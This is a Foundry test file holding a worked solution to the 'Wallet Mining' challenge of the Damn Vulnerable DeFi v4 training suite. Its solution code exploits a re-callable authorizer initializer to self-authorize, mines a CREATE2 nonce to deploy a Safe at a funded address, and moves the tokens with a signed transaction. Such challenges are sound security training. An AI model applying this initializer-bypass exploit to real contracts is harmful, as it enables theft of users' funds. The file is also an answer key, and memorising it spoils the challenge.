// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {ICreateX, CREATEX_DEPLOYMENT_SIGNER, CREATEX_ADDRESS, CREATEX_DEPLOYMENT_TX, CREATEX_CODEHASH} from "./CreateX.sol";
import {SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX, SAFE_SINGLETON_FACTORY_ADDRESS, SAFE_SINGLETON_FACTORY_CODE} from "./SafeSingletonFactory.sol";

/**
 * @title Wallet Mining Challenge Test Suite
 * @notice Tests for the wallet mining vulnerability where an attacker can:
 *         - Self-authorize for a target address containing funds
 *         - Deploy a Safe at that address using CREATE2 prediction
 *         - Extract the funds using the user's compromised private key
 *         - Claim deployment rewards from the WalletDeployer contract
 */

/**
 * @title NonceFinder
 * @notice Helper contract to find the correct nonce for deploying a Safe at the target address
 * @dev Uses CREATE2 address prediction to iterate through nonces until finding the correct one
 */
contract NonceFinder {
    address private constant USER_DEPOSIT_ADDRESS =
        0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;

    address private immutable singletonCopy;
    address private immutable proxyFactory;

    constructor(address _singletonCopy, address _proxyFactory) {
        singletonCopy = _singletonCopy;
        proxyFactory = _proxyFactory;
    }

    /**
     * @notice Finds the nonce that produces the target address when deploying a Safe
     * @param userSafeInitData The initialization data for the Safe
     * @return nonce The nonce that will result in deployment at USER_DEPOSIT_ADDRESS
     */
    function findNonce(
        bytes memory userSafeInitData
    ) external view returns (uint256 nonce) {
        for (uint256 i = 0; i < 100; i++) {
            if (
                predictSafeAddress(userSafeInitData, i) == USER_DEPOSIT_ADDRESS
            ) {
                return i;
            }
        }
        revert("Nonce not found within range");
    }

    /**
     * @notice Predicts the Safe address for given initialization data and nonce
     * @param safeInitData The Safe initialization data
     * @param _nonce The nonce to use in CREATE2 salt
     * @return predicted The predicted address of the Safe deployment
     */
    function predictSafeAddress(
        bytes memory safeInitData,
        uint256 _nonce
    ) private view returns (address predicted) {
        bytes32 salt = keccak256(
            abi.encodePacked(keccak256(safeInitData), _nonce)
        );
        bytes memory deploymentData = abi.encodePacked(
            type(SafeProxy).creationCode,
            uint256(uint160(singletonCopy))
        );

        predicted = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff),
                            proxyFactory,
                            salt,
                            keccak256(deploymentData)
                        )
                    )
                )
            )
        );
    }
}

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS =
        0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        // Deploy Safe Singleton Factory contract using signed transaction
        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        // Deploy CreateX contract using signed transaction
        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(
            CREATEX_ADDRESS.codehash,
            CREATEX_CODEHASH,
            "Unexpected CreateX code"
        );

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                initCode: type(AuthorizerFactory).creationCode
            })
        );
        authorizer = AuthorizerUpgradeable(
            authorizerFactory.deployWithProxy(wards, aims, upgrader)
        );

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) = address(
            SAFE_SINGLETON_FACTORY_ADDRESS
        ).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) = address(SAFE_SINGLETON_FACTORY_ADDRESS).call(
            bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode)
        );
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                initCode: bytes.concat(
                    type(WalletDeployer).creationCode,
                    abi.encode(
                        address(token),
                        address(proxyFactory),
                        address(singletonCopy),
                        deployer
                    ) // constructor args are appended at the end of creation code
                )
            })
        );

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with initial tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay(); // 1 ether
        token.transfer(
            address(walletDeployer),
            initialWalletDeployerTokenBalance
        );

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(
            TransparentProxy(payable(address(authorizer))).upgrader(),
            upgrader
        );
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(
            address(walletDeployer.cook()).code,
            type(SafeProxyFactory).runtimeCode,
            "bad cook code"
        );
        assertEq(
            walletDeployer.cpy().code,
            type(Safe).runtimeCode,
            "no copy code"
        );

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(
            token.balanceOf(address(walletDeployer)),
            initialWalletDeployerTokenBalance
        );
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * @notice Wallet Mining Challenge Solution
     * @dev Exploits the authorization bypass vulnerability to:
     *      1. Self-authorize for the target address
     *      2. Deploy a Safe at the predetermined address containing 20M DVT
     *      3. Extract all tokens using the user's private key
     *      4. Claim the deployment reward
     */
    function test_walletMining() public checkSolvedByPlayer {
        // Generate Safe initialization data for the user
        bytes memory userSafeInitData = _generateSafeInitData();

        // Find the nonce that will deploy the Safe at USER_DEPOSIT_ADDRESS
        uint256 nonce = _findDeploymentNonce(userSafeInitData);

        // Exploit: Authorize ourselves for the target address
        _authorizePlayer();

        // Deploy the Safe and claim deployment reward
        _deployAndClaim(userSafeInitData, nonce);

        // Extract all tokens from the deployed Safe
        _extractTokens();
    }

    /**
     * @notice Generates the Safe initialization data for the user
     */
    function _generateSafeInitData() private view returns (bytes memory) {
        address[] memory userOwners = new address[](1);
        userOwners[0] = user;

        return
            abi.encodeWithSelector(
                Safe.setup.selector,
                userOwners, // owners
                1, // threshold
                address(0), // to
                "", // data
                address(0), // fallbackHandler
                address(0), // paymentToken
                0, // payment
                address(0) // paymentReceiver
            );
    }

    /**
     * @notice Finds the deployment nonce for the target address
     */
    function _findDeploymentNonce(
        bytes memory userSafeInitData
    ) private returns (uint256) {
        NonceFinder nonceFinder = new NonceFinder(
            address(singletonCopy),
            address(proxyFactory)
        );
        return nonceFinder.findNonce(userSafeInitData);
    }

    /**
     * @notice Authorizes the player for the target deposit address
     */
    function _authorizePlayer() private {
        address[] memory wards = new address[](1);
        wards[0] = player;

        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        authorizer.init(wards, aims);
    }

    /**
     * @notice Deploys the Safe and claims the deployment reward
     */
    function _deployAndClaim(
        bytes memory userSafeInitData,
        uint256 nonce
    ) private {
        // Deploy the Safe at the target address
        walletDeployer.drop(USER_DEPOSIT_ADDRESS, userSafeInitData, nonce);

        // Transfer deployment reward to the ward
        token.transfer(ward, walletDeployer.pay());
    }

    /**
     * @notice Extracts all tokens from the deployed Safe using the user's private key
     */
    function _extractTokens() private {
        Safe depositSafe = Safe(payable(USER_DEPOSIT_ADDRESS));

        // Prepare transfer data
        bytes memory transferData = abi.encodeWithSelector(
            token.transfer.selector,
            user,
            DEPOSIT_TOKEN_AMOUNT
        );

        // Generate transaction hash
        bytes32 txHash = depositSafe.getTransactionHash({
            to: address(token),
            value: 0,
            data: transferData,
            operation: Enum.Operation.Call,
            safeTxGas: 0,
            baseGas: 0,
            gasPrice: 0,
            gasToken: address(0),
            refundReceiver: payable(address(0)),
            _nonce: 0
        });

        // Sign with user's private key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute the transaction
        depositSafe.execTransaction({
            to: address(token),
            value: 0,
            data: transferData,
            operation: Enum.Operation.Call,
            safeTxGas: 0,
            baseGas: 0,
            gasPrice: 0,
            gasToken: address(0),
            refundReceiver: payable(address(0)),
            signatures: signature
        });
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(
            address(walletDeployer.cook()).code.length,
            0,
            "No code at factory address"
        );

        // Safe copy account must have code

        assertNotEq(
            walletDeployer.cpy().code.length,
            0,
            "No code at copy address"
        );

        // Deposit account must have code
        assertNotEq(
            USER_DEPOSIT_ADDRESS.code.length,
            0,
            "No code at user's deposit address"
        );

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(
            token.balanceOf(USER_DEPOSIT_ADDRESS),
            0,
            "User's deposit address still has tokens"
        );

        assertEq(
            token.balanceOf(address(walletDeployer)),
            0,
            "Wallet deployer contract still has tokens"
        );

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(
            token.balanceOf(user),
            DEPOSIT_TOKEN_AMOUNT,
            "Not enough tokens in user's account"
        );

        // Player sent payment to ward

        assertEq(
            token.balanceOf(ward),
            initialWalletDeployerTokenBalance,
            "Not enough tokens in ward's account"
        );
    }
}
